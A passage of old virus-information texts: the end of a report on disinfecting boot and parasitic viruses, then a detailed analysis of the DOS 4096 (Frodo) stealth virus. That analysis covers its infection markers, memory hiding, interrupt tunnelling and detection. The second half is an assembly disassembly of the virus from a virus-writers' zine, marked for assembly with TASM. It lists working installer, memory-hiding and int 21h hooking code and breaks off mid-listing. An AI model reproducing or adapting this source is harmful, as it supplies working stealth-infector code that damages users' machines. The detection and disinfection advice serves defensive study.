  reference.  Either way, the sector(s) can be repaired without
  reference to the capabilities of the particular virus as long as the
  machine is running on a trusted (ie: clean) operating system.  Most
  Boot Sector viruses cause no permanent damage during their infection
  routine, but there are some (notably the New Zealand or Stoned
  virus) which can cause damage on certain machine types.  In these
  cases, simple disinfection may not be possible and the user may have
  to resort to the ultimate option of reformatting the disk.  This is
  probably an ideal place to clear some of the misunderstandings about
  disk reformatting as a disinfection exercise.  Under most MSDOS
  operating systems, the very first sector on the disk (identified as
  Sector 1, Track zero, Head zero) contains the Master Boot Record.
  This is ALWAYS loaded into memory when the machine is booted and it
  contains the partition table which lists exactly how distinct areas
  of the disk have been allocated.  Now consider a disk which has been
  partitioned into two separate drives (usually C:  and D:), the
  partition table contains the starting and finishing address of each
  partition (in absolute terms of Track/Head/Sector numbers) as well
  as the type, status and other details about it.   Users will be
  aware that if they have a hard disk partitioned in this way, it is
  easily possible to format either drive C: (first partition) or drive
  D:  (second partition) without damaging data stored on the other
  partition.  Thus it can be appreciated that the ordinary DOS FORMAT
  command does not affect the entire disk.  Even if the physical drive
  contains only one partition, FORMAT will not touch the Master Boot
  Sector.  So, if a virus has modified the Master Boot Record it
  cannot be removed by an ordinary format, a special - highly machine
  specific - low-level format routine is required, followed by
  reconfiguration and re-partitioning with the DOS FDISK program.

  Just as the first sector of the physical disk contains the Master
  Boot Sector, so the first sector of each partition will contain a
  Partition Boot Sector.  If there is more than one partition, one of
  them will be marked within the Master Partition Table as "active"
  and the boot sector of this partition will also be loaded into
  memory when the machine is booted.  Obviously, viruses which infect
  the Partition Boot Record can be destroyed by the normal DOS FORMAT
  command.

  Files infected by Parasitic Viruses present a different range of
  problems for disinfection software.  The most secure method of
  disinfection is still to delete the infected file and replace it
  with a known clean copy from a verified and protected master disk.
  However, this may be inconvenient - the master disk may not be
  readily available - it may itself have become damaged or corrupted -
  they may not even be a master disk!  Whatever the reason, the user
  may be attracted by the possibility of quick and easy virus
  "removal" facilities being offered as part of an antivirus package.
  This is where virus-specific software can become a real boon (always
  assuming that the particular virus causing you problems is "known"
  to the software).  Most parasitic viruses infect files by appending
  the virus code to the end of the existing file and then modifying
  the original file contents so that processing is routed THROUGH the
  virus code first.  In these cases, the virus will usually repair the
  original file contents so that the host program will continue to
  function correctly.  For these viruses, disinfection is simply a
  matter of detecting the section of virus code that does the repair
  and using the details that it contains to effect a permanent repair
  before actually removing the virus code from the end of the file.
  The problems arise from two directions - if the virus is of the
  stealth type, it may fool the operating system to such an extent
  that any self-checking mechanisms within the host program will "see"
  a clean file exactly as intended.  However, once the stealth
  characteristics are removed from the system, the actual repair of
  the file may not be accurate enough to restore the file to full
  health.  This is actually case with at least three software "cure"
  packages when attempting disinfection of the 4K (Frodo) virus.  In
  this case, the virus code is appended to the host file and aligned
  on a paragraph boundary.  The repair of the header section of the
  file may be perfectly alright but removing the virus code can leave
  the small offset used for paragraph alignment.  On ordinary program
  files this caused now problems but on protected files with
  self-checking routines the extra bytes cause the protection
  mechanisms to trigger and prevent program operation.  On data files,
  the presence of any extra bytes will of course produce totally
  unpredictable results.  On a machine with large numbers of infected
  files, there is no doubt that a virus-specific disinfection
  capability could be an enormous time saver but if the implementation
  is anything other than 100% it is best avoided.

  Few implementations of virus-generic recovery software have yet been
  seen and this may be because the processes involved in preparing
  this method are somewhat more time-consuming.  Nevertheless, given
  accurate and well written code, this method does promise much.  The
  theory goes as follows :- assume a program exists which will
  automatically take an exact copy of all specified files (just like a
  backup!) and stores them somewhere.  This program is also capable of
  replacing the originals with the copies on command.  Once the copies
  have been taken, ANY parasitic virus infection can be cured by
  simply restoring the copies and rewriting them over the originals.
  The difficulty is the time and space needed to maintain (and check)
  the copies.  So, if the software is refined so that it no longer
  copies the whole file but just the sensitive sections which are at
  particular risk from virus attack, it can be made much faster and
  will take up less space.  Include similar copies of the Master- and
  Partition-Boot sectors and you have a virus-generic disinfection
  system which will not only disinfect most known viruses, but also
  any of the more primitive virus types which have not yet been
  written!

  All of the foregoing refers specifically to changes brought about
  within files by actual virus infection.  As mentioned in the report
  on the NOMENKLATURA virus, corruption introduced by the trigger or
  payload of a virus is almost invariably incurable.

  The final solution if you are not sure exactly what is infecting
  your system is to reformat your whole system at low level and then
  reconfigure it from scratch with master program files and data from
  your latest backups.  If you DO know what the problem is, such
  drastic action is unnecessary.  If you are using a commercial cure
  program the best advice would be to verify carefully that the
  "cured" program exactly matches the clean master file before you go
  ahead and use it.

  Once again, there is no substitute for regular, verified backups of
  data and configuration files.

  The information contained in this report is the direct result of
  disassembling and analysing a specimen of the virus code.  I take
  great pains to ensure the accuracy of these analyses but I cannot
  accept responsibility for any loss or damage suffered as a result of
  any errors or omissions.  If any errors of fact are noted, please
  let me know at :-

    The Virus Information Service,
    Treble Clef House,
    64, Welford Road,
    WIGSTON MAGNA,
    Leicester  LE8 1SL

  or call +44 (0)533 883490

  Jim Bates

  Introduction:

     The 4096 virus is one of the most complex and hard to detect
stealth viruses ever created.  It originated in Israel and has
several different names, including Frodo, IDF or Israeli Defense
Forces, and 100 Years.  It is 4096 bytes in length (hence its
name), and is very misunderstood by many viral experts.  There
have been reports that 4096 is extremely destructive; that it
slowly cross-links all files on disk, and that it intentionally
crashes computers on or after September 22, but it is actually
quite harmless.  When 4096 is in memory, files do appear to have
an allocation error because they take up more clusters than their
sizes say they do, but that is simply because 4096 is hiding
itself.  Also, the system crash that occurs on or after September
22 is not intentional.  The 4096 virus is known as "Frodo"
because on or after the birthday of Frodo Baggins, a main 
character in Lord of the Rings, it attempts to write a trojan
boot sector that displays "FRODO LIVES" surrounded by a moving
pattern.  But, for some reason, all versions of the virus have
been corrupted at the end, and instead of writing the trojan, the
virus crashes.

Basic Functional Characteristics:

     The 4096 virus is a memory resident COM/EXE infector that
employs several different stealth techniques.  It is probably the
most complete stealth virus known, and it is almost impossible to
find when it is in memory.  It will infect any COM or EXE file as
long as it is not a DOS system file, and it marks the files that
it has infected by adding 100 years to those files' datestamp.
     There is only one thing that 4096 does that could be
considered destructive.  On or after September 22, 4096 attempts
to write a trojan boot sector to the A and C drives, but the code
to write this trojan is garbled in all samples, causing computers
to crash instead.
     The 4096 virus uses several different stealth methods to
keep itself hidden when in memory, including capturing the DOS
interrupt 21 handler to screen all file operations.  Any time a
program tries to access a file, 4096 makes sure that the handler
returns what the file would be before infection.  This stealth
method is so complete that when the virus is in memory, an
individual could do a byte-to-byte comparison between an infected
file and a write-protected backup and come up with no differences
at all.
     The virus also has several other stealth routines which do
such things as adjusting an infected file's date back to what it
was before infection, and also returning an infected file's
original size when asked for.  There is even a section of code
which saves the number of free clusters before a file is
infected, and later restores that number so that the number of
bytes free on a disk isn't changed when a file is infected!  All
in all, it is a very complete stealth virus, and probably the
most complex in existence.

How 4096 Infects Files:

     The 4096 virus will normally infect files on two conditions:

               1)  When a program is executed.
               2)  When a file is closed using a handle.

Every program that is run will be infected, but not every file
that is closed will be.  When a file with an EXE or COM extension
is opened with a handle, 4096 records that file's handle and the
caller's PSP address in a table.  When any file is closed using a
handle, 4096 scans the table, and if the caller's PSP address and
the file's handle both match up then the file is infected.  This
could obviously lead to some pretty scary scenarios.  If a virus
scanner opened every single program to scan it, then closed it
afterwards, a whole hard disk could become infected.  When
programs are copied, if the copying programs use handle
functions, files could be infected without even being run! 
Programs created by a compiler could be infected without ever
having been run before if the compiler used handle functions. 
The possibilities are endless.
     As in any successful virus, 4096 has to have a way to tell
if a file has already been infected.  Usually the normal method
is to leave a string of bytes in a predictable place so that the
virus can easily tell if the file is already infected.  But 4096
has a much more ingenious way of leaving a signature.  On COM
files infected by 4096, the virus always makes sure that the
first three words add up to zero.  This way the virus can simply
add up the first three words of a file to check if it is
infected, and if the answer is zero, then it is.
     The method of marking an EXE file infected with 4096 is
hardly more complex.  Every EXE program has a header at the
start, giving important information including the CS:IP at
startup for that program.  The 4096 virus modifies this header
when it infects an EXE file, and when it does, it always sets IP
to be 0001 at start.  That way 4096 only has to look at the
startup IP of an EXE file, and if it's 0001, then the file is
probably infected.
     As usual, 4096 makes sure to restore the original values for
the bytes it modifies when other programs access infected files. 
Because of this, none of these changes can be spotted when 4096
is active.

How the 4096 Virus Installs Itself in Memory:

     The way that 4096 installs itself in memory is very
interesting compared to more common memory resident viruses.  It
doesn't try to place itself as high in memory as possible to keep
from being overwritten, like most memory resident viruses do. 
Rather it sets up a place where it will not be overwritten, then
it copies itself there.  To completely understand the way it does
this, the DOS memory structure must be explained.
     DOS controls memory by dividing it into different memory
blocks.  Each memory block is either one or more paragraphs (16
bytes of memory) grouped together.  The paragraph right before
each memory block is that block's memory control block (MCB for
short), and it contains important information about the memory
block following it.  Here is the layout of a normal MCB:

OFFSET    LENGTH         DESCRIPTION

00h       BYTE      "Z"=last memory block, "M"=another follows.
01h       WORD      PSP segment address of block's owner.
03h       WORD      Number of paragraphs controlled.
05h       11 BYTES  Filename (if a device driver was loaded).

All of the memory blocks are contiguous; the end of one memory
block is right next to the start of the next one.  The first
memory block is always used by DOS.
     The PSP segment of the memory block's owner is very
important.  It is used by DOS to determine which memory blocks
need to be released when a program terminates, or which need to
be saved if a program is a TSR.  The memory block that DOS itself
uses normally has a value of 0008 in this position, but the
reason why is obscure.  Free memory blocks have 0000 in this
position.
     The first thing that 4096 does when it is installing itself
in memory is it resizes the current memory block of the host to
the maximum size using DOS function 4Ah.  This is to make sure
that there isn't anything above the program that could be
overwritten.  Then the program begins to work with the memory. 
First it adjusts the host's PSP, namely the "First Unused
Segment" field (offset 02h), so that it looks like 4096 isn't
there.  Then it goes through the host's MCB and adjusts it to
look like 4096 isn't there, too.  After it has cut itself off
from the host this way, it creates its own MCB and then copies
itself to the new block controlled by the new MCB.  One
interesting thing about this new MCB is that 4096 doesn't set the
owner of the block to the host's segment; rather it sets it to
the segment of the first memory block owned by DOS.  That way it
will never be released.  Now 4096 is safely in memory, and it is
ready to put its stealth routines into operation.

A Discussion of the Code:

     The list of int 21 functions that the 4096 virus watches is
quite extensive.  It monitors 20 different functions in all, and
adjusts the outputs of all of them to remain undetected.  Here is
a list of functions that 4096 monitors:

Function 0Fh - Open file with FCB
Function 11h - Find first file with FCB
Function 12h - Find next file with FCB
Function 14h - Sequential read with FCB
Function 21h - Random read with FCB
Function 23h - Get file size
Function 27h - Random block read with FCB
Function 30h - Get DOS version number
Function 37h - Undocumented (get or set switch character)
Function 3Ch - Create file
Function 3Dh - Open file
Function 3Eh - Close file
Function 3Fh - Read file or device
Function 40h - Write file or device
Function 42h - Set file pointer
Function 48h - Allocate memory block
Function 4Bh - Execute program
Function 4Eh - Find first file
Function 4Fh - Find next file
Function 57h - Get or set file date or time

It is easy to see that all of the important file operations are
watched by 4096, as well as some others which have different,
less obvious uses.  One of these is function 30h.  The 4096 virus
doesn't actually modify anything that is returned by this
function, but it checks the date every time it is called to see
if it is past September 22.  If so then it goes to the trojan
writing routine and crashes (see the Bugs section).  Since most,
if not all programs call this function, it is a very easy way to
make sure that the trojan routine will be called on the right
date.
     The other non-file function that 4096 watches for is
function 37h.  This function is undocumented, and its purpose is
to get or set the "switch" character, which can be a slash or a
hyphen.  This is used mainly in DOS to see if, for example, the
dir command should be "DIR /W" or "DIR -W".  The 4096 virus
assumes that if this function is being called then it's probably
an internal DOS routine calling it (like the COPY, DIR, DEL, and
RENAME commands, for example), and it sets up accordingly.
     The way that 4096 traps interrupt 21 is not in itself hard
to understand, but it will be discussed, since it isn't the most
common programming method.  It's often thought that the only way
to capture an interrupt is to adjust the Interrupt Vector Table
to point at the new handler,  but that isn't what 4096 does to
capture interrupt 21.  When 4096 is loaded, it constructs a jump
in the five-byte buffer at PATCH_BUF and then exchanges it with
the first five bytes of the real int 21 handler.  That way the
Interrupt Vector Table, which is commonly watched by many virus
checkers, will not be modified.
     One of the trickier parts of 4096 is the way it jumps to the
different subfunction handlers when an interrupt 21 is called. 
There is a table that starts at FUNCTION_TABLE which tells where
each routine may be found.  Each entry has three bytes in it: 
the first byte is the function number, and the last word is the
offset of the routine to handle that function.  When the virus'
int 21 handler is called, it first pushes BX onto the stack. 
Then it points DS:BX at the start of the table and checks if the
function number (in AH) is equal to the first byte of the entry. 
If not then it jumps to a routine that increments the pointer for
the next entry.  If the function number is in the table, then the
word that was in BX (now on the stack) is exchanged with the
offset in the table.  Then the routine RETs to this offset.
     Probably the most complex part of the 4096 virus is its use
of interrupt 1.  Interrupt 1 is the CPU-generated Single-Step
interrupt and is controlled by the trap flag (bit 8 of the flags
register).  When the trap flag is set, the CPU does an INT 1
after every instruction is executed.  Interrupt 1 is used mainly
in debuggers to examine the registers after each instruction is
executed, for example the "t" command in DEBUG.
     The 4096 virus uses interrupt 1 for two main functions,
depending on the value of a flag called INT_1_FLAG in the
assembly listing.  If this flag equals 1 then the int 1 handler
responds one way, and if the flag equals 0 or 2 then the handler
responds in a different way.  It is also important to note that
4096's handler doesn't actually begin to execute until certain
requirements are met.  Every time the int 1 handler is jumped to,
4096 checks the segment (which is on the stack) to see if the
interrupted code is either in ROM (above C000), or in DOS (below
DOS's data segment).  If not then the handler immediately IRETs
back to the interrupted code.  But if so, then the handler goes
on.
     Before the rest of this section is explained, the method of
trapping and using interrupts needs to be reviewed for clarity's
sake.  When an interrupt is called, the CPU retrieves the address
to jump to from the Interrupt Vector Table starting at 0:0.  But
the address stored there isn't always the actual interrupt
handler.  Especially with interrupts 13h and 21h, many TSRs often
trap the interrupts, putting their addresses in the IVT, and
later jump to the real handlers.  So the address in the IVT
doesn't always point to the actual handler.  This is simple
enough.  But now 4096's interrupt 1 handler comes into play.
     If the 4096 virus was to execute, for example, an INT 13h
instruction, it is very likely that a TSR installed in memory
could interfere with, or even block, the desired results.  So the
virus uses interrupt 1 to watch the segment address.  When the
segment address of the interrupted code is above C000 (meaning
the actual BIOS routine is running), or when the address is below
the DOS data segment (meaning the actual DOS routine is running),
4096 can quickly store the address that is on the stack.  And now
it has the actual interrupt handler's address, skipping all the
TSRs in between!  This is the main operation of functions 0 and
2, except that when function 2 is executed, the handler returns
prematurely to the procedure that uses it (called CATCH_INTS in
the assembly listing).
     Function 1 of the handler has a slightly different task. 
The virus' method of capturing interrupt 21h is easily
understandable.  The only problem is how 4096 replaces the
beginning of the handler with the jump to itself when it turns
control back over to the real int 21h handler (starting at
DO_INT_21).  But that is easily fixed with the use of interrupt
1.
     There is another byte in 4096's data area that is used by
function 1.  This byte is a counter set to 4 at DO_INT_21.  When
4096 is ready to return control to the real int 21 handler, it
starts the int 1 handler executing.  Again, the interrupt 1
handler lies dormant until the interrupted code is either in BIOS
or (in this case) DOS.  Then it springs into action.  After each
instruction of the real interrupt 21 handler is executed, the int
1 handler decrements the counter byte.  Once the counter reaches
zero (the first 4 instructions of the int 21 handler have been
executed), the int 1 handler repatches the start of the int 21
handler with the jump to 4096 and uninstalls itself.  Now the
interrupt 21 handler is running as if nothing had been modified,
and the virus' jump is in place for the next time an INT 21h is
executed.
     One other technique is used by the program in relation to
interrupt 1.  It often uses the code:

          IN        AL,21
          MOV       ORIG_INT_MASK,AL
          MOV       AL,FF
          OUT       21,AL

These sections directly control the 8259 Hardware Interrupt
Controller.  The 8259 is in charge of allowing, or not allowing,
the different hardware-initiated interrupts to take place, and it
is controlled through ports 20h and 21h.  The hardware interrupts
are:

IRQ0 - Divide error
IRQ1 - Single step
IRQ2 - Nonmaskable Interrupt - usually a memory tester
IRQ3 - Breakpoint
IRQ4 - Overflow
IRQ5 - Print screen
IRQ6 - Reserved (invalid opcode)
IRQ7 - Reserved (coprocessor not present)

All of these interrupts can be controlled with the 8259, with the
exception of IRQ2, which cannot be masked out.  Right before 4096
sets up its own int 1 handler to run, it masks out all interrupts
by sending FFh to port 21h.  This disables interrupt 1 from going
so that the virus effectively grabs control from any program that
may be using interrupt 1 at the time.  After the virus is done
setting up its own int 1 handler, it can restore the mask to what
it was before, allowing int 1 (and the other hardware interrupts)
to execute as before.  That way, no antiviral program or debugger
can control what 4096 does with interrupt 1.

The Source Code:

(LISTING OF THE SOURCE CODE)

Hex Listing:

Virus Loader:

Notes on Variations:

     There are many "variants" of 4096 floating around, but they
don't have any differences in the code.  The only thing that
doesn't match up is the garbled section at then end, and also
possibly the size of the garbled section.  Also, amazingly, the
4096 virus is probably the most "undefiled" viruses in existance. 
This is amazing from the standpoint that it would be very easy to
put an extremely destructive routine in the garbled section at
the end and spread this new ominous, deadly virus throughout a
company or network.  In this way the garbling at the end might
keep such a deadly virus from spreading.

Detection and Disinfection:

     The easiest way to tell if 4096 is in memory is by setting
the computer's date to some date after September 22 and see if it
crashes.  If so then the computer is probably infected with 4096. 
It is almost impossible to detect 4096 by scanning files because
4096's defenses are so complete that even a byte-to-byte
comparison with a backup copy will show no differences.  Probably
the best way to detect 4096 on a disk is to look at that disk's
directory with some program like Norton Utilities, X-Tree, etc.
that will show the complete file date (of course, 4096 can't be
running).  If the date has had 100 years added to it, then 4096
is most likely on that disk.  Using a virus scanner on a
"sterile" computer is the best way to disinfect disks with a 4096
infection.
     The most accurate way of identifying whether 4096 is active
on a system is to scan all of base memory for it.  Selecting a
20- to 30-byte string from 4096's middle (such as the function
table) and scanning memory for it will yield accurate results. 
If the virus is active in memory, there is only one thing that
can really be done to clean up the machine.  First, a clean boot
disk must be prepared, and a virus scanner/disinfector must be
copied to it.  Then reboot the computer with the boot disk and
disinfect the whole system with the virus scanner.  After this is
done, reboot the computer again and check if 4096 is still in
memory.  If so then start again from the beginning.  If not, then
4096 has probably been eradicated.
     The 4096 virus is very hard to detect and extremely quick in
spreading.  A computer can seem completely disinfected, and then
an obscure file in an unknown subdirectory could completely
infiltrate the system in a matter of minutes.  Because of this, a
freshly-formatted disk with the DOS system files and a virus
scanner that can disinfect 4096 should be made up before any
experiments are done with this virus!

Bugs:

     The 4096 virus is amazingly well coded for such a large
virus.  The fact that the virus is so large, yet so unerringly
complete points to the likelihood that it was coded by more than
one individual.  There is only one problem with the 4096 itself,
and that is the garbled code at the end.  It is hard to say what
causes this garbling, but it's probably something that the virus
designers didn't expect, since it seems to have occurred quite
often.  There are many "versions" of 4096, with the only
difference being the values of the garbled bytes.  Fortunately
there is enough good code left at the end to figure out what was
supposed to be going on, and it's also fortunate that the part
that was scrambled is the only malicious part of the whole virus. 
So in a way, this garbling is almost a benefit!
     Another noticable "problem" isn't really a problem, but just
a sign of 4096 at work in a system.  If any disk analyzer like
CHKDSK or Norton Disk Doctor is run on an infected system then
numerous file allocation errors will show up because infected
files take up more clusters than their sizes indicate.  This
could obviously create a huge mess if an analyzer was to try to
correct these errors, and the problem would most likely be blamed
on the disk analyzer itself.
     There is also a problem when 4096 tries to execute on a
system with a disk caching program and DOS 3.x.  Because of the
way that 4096 works with the number of free clusters on a disk,
it will often lock up the system when a disk caching program is
running.  The 4096 virus functions best when it is on a system
with none of these caching programs running, so that there's
nothing to interfere with it.

;;;;;;;;;;;;;;;;;;;;;

_4096           segment byte public
                assume  cs:_4096, ds:_4096

; 4096 Virus
; Disassembly done by Dark Angel of Phalcon/Skism for 40Hex Issue #9
; Assemble with TASM; the resultant file size is 4081 bytes

                org     0
startvirus:
                db      0
                jmp     installvirus
oldheader: ; original 1Ch bytes of the carrier file
                retn
                db      75h,02,44h,15h,46h,20h
                db      'Copyright Bourb%}i, I'
endoldheader:
EXEflag         db       00h
                db      0FEh, 3Ah

int1: ; locate the BIOS or DOS entry point for int 13h and int 21h
                push    bp                      ; set up stack frame
                mov     bp,sp
                push    ax
                cmp     word ptr [bp+4],0C000h  ; in BIOS?
                jnb     foundorigint            ; nope, haven't found it
                mov     ax,cs:DOSsegment        ; in DOS?
                cmp     [bp+4],ax
                jbe     foundorigint
exitint1:
                pop     ax
                pop     bp
                iret
foundorigint:
                cmp     byte ptr cs:tracemode,1
                jz      tracemode1
                mov     ax,[bp+4]               ; save segment of entry point
                mov     word ptr cs:origints+2,ax
                mov     ax,[bp+2]               ; save offset of entry point
                mov     word ptr cs:origints,ax
                jb      finishint1
                pop     ax
                pop     bp
                mov     ss,cs:savess            ; restore the stack to its
                mov     sp,cs:savesp            ; original state
                mov     al,cs:saveIMR           ; Restore IMR
                out     21h,al                  ; (enable interrupts)
                jmp     setvirusints
finishint1:
                and     word ptr [bp+6],0FEFFh  ; turn off trap flag
                mov     al,cs:saveIMR           ; and restore IMR
                out     21h,al
                jmp     short exitint1
tracemode1:
                dec     byte ptr cs:instructionstotrace
                jnz     exitint1
                and     word ptr [bp+6],0FEFFh  ; turn off trap flag
                call    saveregs
                call    swapvirint21            ; restore original int
                lds     dx,dword ptr cs:oldint1 ; 21h & int 1 handlers
                mov     al,1
                call    setvect
                call    restoreregs
                jmp     short finishint1

getint:
                push    ds
                push    si
                xor     si,si                   ; clear si
                mov     ds,si                   ; ds->interrupt table
                xor     ah,ah                   ; cbw would be better!?
                mov     si,ax
                shl     si,1                    ; convert int # to offset in
                shl     si,1                    ; interrupt table (int # x 4)
                mov     bx,[si]                 ; es:bx = interrupt vector
                mov     es,[si+2]               ; get old interrupt vector
                                                ; save 3 bytes if use les bx,[si]
                pop     si
                pop     ds
                retn

installvirus:
                mov     word ptr cs:stackptr,offset topstack
                mov     cs:initialax,ax         ; save initial value for ax
                mov     ah,30h                  ; Get DOS version
                int     21h

                mov     cs:DOSversion,al        ; Save DOS version
                mov     cs:carrierPSP,ds        ; Save PSP segment
                mov     ah,52h                  ; Get list of lists
                int     21h

                mov     ax,es:[bx-2]            ; segment of first MCB
                mov     cs:DOSsegment,ax        ; save it for use in int 1
                mov     es,ax                   ; es = segment first MCB
                mov     ax,es:[1]               ; Get owner of first MCB
                mov     cs:ownerfirstMCB,ax     ; save it
                push    cs
                pop     ds
                mov     al,1                    ; get single step vector
                call    getint
                mov     word ptr ds:oldint1,bx  ; save it for later
                mov     word ptr ds:oldint1+2,es; restoration
                mov     al,21h                  ; get int 21h vector
                call    getint
                mov     word ptr ds:origints,bx
                mov     word ptr ds:origints+2,es
                mov     byte ptr ds:tracemode,0 ; regular trace mode on
                mov     dx,offset int1          ; set new int 1 handler
                mov     al,1
                call    setvect
                pushf
                pop     ax
                or      ax,100h                 ; turn on trap flag
                push    ax
                in      al,21h                  ; Get old IMR
                mov     ds:saveIMR,al
                mov     al,0FFh                 ; disable all interrupts
                out     21h,al
                popf
                mov     ah,52h                  ; Get list of lists
                pushf                           ; (for tracing purposes)
                call    dword ptr ds:origints   ; perform the tunnelling
                pushf
                pop     ax
                and     ax,0FEFFh               ; turn off trap flag
                push    ax
                popf
                mov     al,ds:saveIMR           ; reenable interrupts
                out     21h,al
                push    ds
                lds     dx,dword ptr ds:oldint1
                mov     al,1                    ; restore int 1 to the
                call    setvect                 ; original handler
                pop     ds
                les     di,dword ptr ds:origints; set up int 21h handlers
                mov     word ptr ds:oldint21,di
                mov     word ptr ds:oldint21+2,es
                mov     byte ptr ds:jmpfarptr,0EAh ; jmp far ptr
                mov     word ptr ds:int21store,offset otherint21
                mov     word ptr ds:int21store+2,cs
                call    swapvirint21            ; activate virus in memory
                mov     ax,4B00h
                mov     ds:checkres,ah          ; set resident flag to a
                                                ; dummy value
                mov     dx,offset EXEflag+1     ; save EXE flag
                push    word ptr ds:EXEflag
                int     21h                     ; installation check
                                                ; returns checkres=0 if
                                                ; installed

                pop     word ptr ds:EXEflag     ; restore EXE flag
                add     word ptr es:[di-4],9
                nop                             ; !?
                mov     es,ds:carrierPSP        ; restore ES and DS to their
                mov     ds,ds:carrierPSP        ; original values
                sub     word ptr ds:[2],(topstack/10h)+1
                                                ; alter top of memory in PSP
                mov     bp,ds:[2]               ; get segment
                mov     dx,ds
                sub     bp,dx
                mov     ah,4Ah                  ; Find total available memory
                mov     bx,0FFFFh
                int     21h

                mov     ah,4Ah                  ; Allocate all available memory
                int     21h

                dec     dx                      ; go to MCB of virus memory
                mov     ds,dx
                cmp     byte ptr ds:[0],'Z'     ; is it the last block?
                je      carrierislastMCB
                dec     byte ptr cs:checkres    ; mark need to install virus
carrierislastMCB:
                cmp     byte ptr cs:checkres,0  ; need to install?
                je      playwithMCBs            ; nope, go play with MCBs
                mov     byte ptr ds:[0],'M'     ; mark not end of chain
playwithMCBs:
                mov     ax,ds:[3]               ; get memory size controlled
                mov     bx,ax                   ; by the MCB
                sub     ax,(topstack/10h)+1     ; calculate new size
                add     dx,ax                   ; find high memory segment
                mov     ds:[3],ax               ; put new size in MCB
                inc     dx                      ; one more for the MCB
                mov     es,dx                   ; es->high memory MCB
                mov     byte ptr es:[0],'Z'     ; mark end of chain
                push    word ptr cs:ownerfirstMCB ; get DOS PSP ID
                pop     word ptr es:[1]         ; make it the owner
                mov     word ptr es:[3],160h    ; fill in the size field
                inc     dx
                mov     es,dx                   ; es->high memory area
                push    cs
                pop     ds
                mov     cx,(topstack/2)         ; zopy 0-1600h to high memory
                mov     si,offset topstack-2
                mov     di,si
                std                             ; zopy backwards
                rep     movsw
                cld
                push    es                      ; set up stack for jmp into
                mov     ax,offset highentry     ; virus code in high memory
                push    ax
                mov     es,cs:carrierPSP        ; save current PSP segment
                mov     ah,4Ah                  ; Alter memory allocation
                mov     bx,bp                   ; bx = paragraphs
                int     21h
                retf                            ; jmp to virus code in high
highentry:                                      ; memory
                call    swapvirint21
                mov     word ptr cs:int21store+2,cs
                call    swapvirint21
                push    cs
                pop     ds
                mov     byte ptr ds:handlesleft,14h ; reset free handles count
                push    cs
                pop     es
                mov     di,offset handletable
                mov     cx,14h
                xor     ax,ax                   ; clear handle table
                rep     stosw
                mov     ds:hideclustercountchange,al ; clear the flag
                mov     ax,ds:carrierPSP
                mov     es,ax                   ; es->PSP
                lds     dx,dword ptr es:[0Ah]   ; get terminate vector (why?)
                mov     ds,ax                   ; ds->PSP
                add     ax,10h                  ; adjust for PSP
                add     word ptr cs:oldheader+16h,ax ; adjust jmp location
                cmp     byte ptr cs:EXEflag,0   ; for PSP
                jne     returntoEXE
returntoCOM:
                sti
                mov     ax,word ptr cs:oldheader; restore first 6 bytes of the
                mov     ds:[100h],ax            ; COM file
                mov     ax,word ptr cs:oldheader+2
                mov     ds:[102h],ax
                mov     ax,word ptr cs:oldheader+4
                mov     ds:[104h],ax
                push    word ptr cs:carrierPSP  ; Segment of carrier file's
                mov     ax,100h                 ; PSP
                push    ax
                mov     ax,cs:initialax         ; restore orig. value of ax
                retf                            ; return to original COM file

returntoEXE:
                add     word ptr cs:oldheader+0eh,ax
                mov     ax,cs:initialax         ; Restore ax
                mov     ss,word ptr cs:oldheader+0eh ; Restore stack to
                mov     sp,word ptr cs:oldheader+10h ; original value
                sti
                jmp     dword ptr cs:oldheader+14h ; jmp to original cs:IP
                                                ; entry point
entervirus:
                cmp     sp,100h                 ; COM file?
                ja      dont_resetstack         ; if so, skip this
                xor     sp,sp                   ; new stack
dont_resetstack:
                mov     bp,ax
                call    next                    ; calculate relativeness
next:
                pop     cx
                sub     cx,offset next          ; cx = delta offset
                mov     ax,cs                   ; ax = segment
                mov     bx,10h                  ; convert to offset
                mul     bx
                add     ax,cx
                adc     dx,0
                div     bx                      ; convert to seg:off
                push    ax                      ; set up stack for jmp
                mov     ax,offset installvirus  ; to installvirus
                push    ax
                mov     ax,bp
                retf                            ; go to installvirus

int21commands:
                db      30h     ; get DOS version
                dw      offset getDOSversion
                db      23h     ; FCB get file size
                dw      offset FCBgetfilesize
                db      37h     ; get device info
                dw      offset get_device_info
                db      4Bh     ; execute
                dw      offset execute
                db      3Ch     ; create file w/ handle
                dw      offset createhandle
                db      3Dh     ; open file
                dw      offset openhandle
                db      3Eh     ; close file
                dw      offset handleclosefile
                db      0Fh     ; FCB open file
                dw      offset FCBopenfile
                db      14h     ; sequential FCB read
                dw      offset sequentialFCBread
                db      21h     ; random FCB read
                dw      offset randomFCBread
                db      27h     ; random FCB block read
                dw      offset randomFCBblockread
                db      11h     ; FCB find first
                dw      offset FCBfindfirstnext
                db      12h     ; FCB find next
                dw      offset FCBfindfirstnext
                db      4Eh     ; filename find first
                dw      offset filenamefindfirstnext
                db      4Fh     ; filename find next
                dw      offset filenamefindfirstnext
                db      3Fh     ; read
                dw      offset handleread
                db      40h     ; write
                dw      offset handlewrite
                db      42h     ; move file pointer
                dw      offset handlemovefilepointer
                db      57h     ; get/set file time/date
                dw      offset getsetfiletimedate
                db      48h     ; allocate memory
                dw      offset allocatememory
endcommands:

otherint21:
                cmp     ax,4B00h                ; execute?
                jnz     notexecute
                mov     cs:checkres,al          ; clear the resident flag
notexecute:
                push    bp                      ; set up stack frame
                mov     bp,sp
                push    [bp+6]                  ; push old flags
                pop     cs:int21flags           ; and put in variable
                pop     bp                      ; why?
                push    bp                      ; why?
                mov     bp,sp                   ; set up new stack frame
                call    saveregs
                call    swapvirint21            ; reenable DOS int 21h handler
                call    disableBREAK
                call    restoreregs
                call    _pushall
                push    bx
                mov     bx,offset int21commands ; bx->command table
scanforcommand:
                cmp     ah,cs:[bx]              ; scan for the function
                jne     findnextcommand         ; code/subroutine combination
                mov     bx,cs:[bx+1]
                xchg    bx,[bp-14h]
                cld
                retn
findnextcommand:
                add     bx,3                    ; go to next command
                cmp     bx,offset endcommands   ; in the table until
                jb      scanforcommand          ; there are no more
                pop     bx
exitotherint21:
                call    restoreBREAK
                in      al,21h                  ; save IMR
                mov     cs:saveIMR,al
                mov     al,0FFh                 ; disable all interrupts
                out     21h,al
                mov     byte ptr cs:instructionstotrace,4 ; trace into
                mov     byte ptr cs:tracemode,1           ; oldint21
                call    replaceint1             ; set virus int 1 handler
                call    _popall
                push    ax
                mov     ax,cs:int21flags        ; get the flags
                or      ax,100h                 ; turn on the trap flag
                push    ax                      ; and set it in motion
                popf
                pop     ax
                pop     bp
                jmp     dword ptr cs:oldint21   ; chain back to original int
                                                ; 21h handler -- do not return

